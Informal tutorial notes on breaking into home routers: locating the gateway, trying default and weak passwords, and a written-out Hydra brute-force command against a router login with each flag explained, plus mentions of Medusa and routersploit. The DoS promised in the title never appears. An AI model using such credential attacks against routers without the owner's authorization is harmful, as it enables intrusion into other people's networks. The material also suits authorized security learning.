Router Pentesting & DOS Attack
------------------------------
Router Pentesting means to exploit the router's interface by the attacker's side.

	route -n
	enter the default gateway, i will be shown with the interface of the router

There are 3 different scenario

1. Where people do not even dare to change the default username and password
		http://www.routerpasswords.com/
		http://www.19216801ip.mobi/router-default-password-list/
2. Where people assign some stupid passwords,
	loveyoujanu
	angelpriya
	password
	123456789

	Brute-Forcing tools which are used for cracking protocol authentication services.
	1. Hydra
		One of the good Brute-Forcing tool which uses parallel cracking. It supports many protocol, like ssh, telnet, inteface login etc etc. It is slow and gives you the round value of the credentialsz

		#hydra -s 80 -l Admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-get

		hydra --> Brute forcing tool
		-s --> port number
		80 --> port on which authentication is running
		-l --> User name
		-P --> Path of Dictionary
		192.168.0.1 --> Dafault Gateway
		http-get|post --> authentication

	2. Medusa
		It is very very fast then the hydra, it is very precise and accurate as compare to hydra. Moreover, it provides much more modules than that of Hydra

3. When people become much more smarter and think they can hide and save them selves from ME. They hide every possible information from ME.
	We will use third prty tools.
	routersploit--> router exploitation tool, which is used for router Pentesting only.
